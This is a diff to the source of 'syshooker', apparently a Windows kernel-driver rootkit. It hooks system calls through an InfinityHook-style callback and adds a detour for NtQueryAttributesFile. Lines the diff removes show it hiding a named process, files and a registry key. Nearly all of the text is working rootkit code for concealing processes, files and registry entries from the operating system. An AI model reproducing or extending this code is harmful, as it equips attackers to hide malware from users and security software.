@@ -34,6 +34,7 @@ SyshookerSettings Settings = {
 //#include "NtWriteFile.h" // not using this one
 #include "NtQueryDirectoryFile.h"
 #include "NtQueryDirectoryFileEx.h"
+#include "NtQueryAttributesFile.h"
 #include "NtQuerySystemInformation.h"
 #include "NtOpenKey.h"
 #include "NtOpenKeyEx.h"
@@ -54,19 +55,6 @@ char CALLBACK_OVERWRITE_ENABLED = 0;
 *	turned off.
 */
 extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
-	//UNREFERENCED_PARAMETER(RegistryPath);
-
-	// TODO - remove this hardcoded process hide name
-	NameNode* ProcessHead = CreateNameNode(L"Test1.exe", 9);
-	NameNode* FileHead = CreateNameNode(L"hideme.txt", 10);
-	Settings.ProcessSyshookerNamesHead = ProcessHead;
-	Settings.FileSyshookerNamesHead = FileHead;
-	// add another file
-	FileHead = CreateNameNode(L"tajnysubor.txt", 14);
-	Settings.FileSyshookerNamesHead->Next = FileHead;
-	NameNode* RegistryHead = CreateNameNode(L"myKey", 5);
-	Settings.RegistrySyshookerNamesHead = RegistryHead;
-
 	// IRP Routines
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
@@ -94,11 +82,6 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		IoDeleteDevice(DeviceObject);
 		return status;
 	}
-
-	//
-	// Figure out when we built this last for debugging purposes.
-	//
-	kprintf("[+] syshooker: Loaded.\n");
 	
 	DriverObject->DriverUnload = DriverUnload;
 
@@ -188,25 +171,17 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	}
 	else kprintf("[+] syshooker: NtOpenKeyEx address: %p.\n", OriginalNtOpenKeyEx);
 
-	// Try to find addresses of the registry-related syscalls
-	// const void* NtOpenKeyAddr = GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
-	// kprintf("[+] syshooker: NtOpenKey address: %p\n", NtOpenKeyAddr);
-
-	/*const void* NtOpenKeyExAddr = GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
-	kprintf("[+] syshooker: NtOpenKeyEx address: %p\n", NtOpenKeyExAddr);
-
-	const void* NtQueryKeyAddr = GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
-	kprintf("[+] syshooker: NtQueryKey address: %p\n", NtQueryKeyAddr);
-
-	const void* NtQueryValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYVALUEKEY, (PCHAR)SsdtAddress);
-	kprintf("[+] syshooker: NtQueryValueKey address: %p\n", NtQueryValueKeyAddr);
-
-	const void* NtQueryMultipleValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYMULTIPLEVALUEKEY, (PCHAR)SsdtAddress);
-	kprintf("[+] syshooker: NtQueryMultipleValueKey address: %p\n", NtQueryMultipleValueKeyAddr);*/
+	// NtQueryAttributesFile
+	OriginalNtQueryAttributesFile = (NtQueryAttributesFile_t)GetSyscallAddress(INDEX_NTQUERYATTRIBUTESFILE, (PCHAR)SsdtAddress);
+	if (!OriginalNtQueryAttributesFile) {
+		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtQueryAttributesFile);
+		return STATUS_ENTRYPOINT_NOT_FOUND;
+	}
+	else kprintf("[+] syshooker: NtQueryAttributesFile address: %p.\n", OriginalNtQueryAttributesFile);
 
 	//
 	// Initialize infinity hook. Each system call will be redirected
-	// to our syscall stub.
+	// to our syscall callback function.
 	//
 	NTSTATUS Status = IfhInitialize(SyscallCallback);
 	if (!NT_SUCCESS(Status))
@@ -217,6 +192,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	{
 		CALLBACK_OVERWRITE_ENABLED = 1;
 	}
+
+	kprintf("[+] syshooker: Loaded.\n");
 	
 	return Status;
 }
@@ -305,6 +282,12 @@ void __fastcall SyscallCallback(
 	if (*SystemCallFunction == OriginalNtOpenKeyEx)
 	{
 		*SystemCallFunction = DetourNtOpenKeyEx;
+	}
+
+	//NtQueryAttributesFile
+	if (*SystemCallFunction == OriginalNtQueryAttributesFile)
+	{
+		*SystemCallFunction = DetourNtQueryAttributesFile;
 	}
 }
 
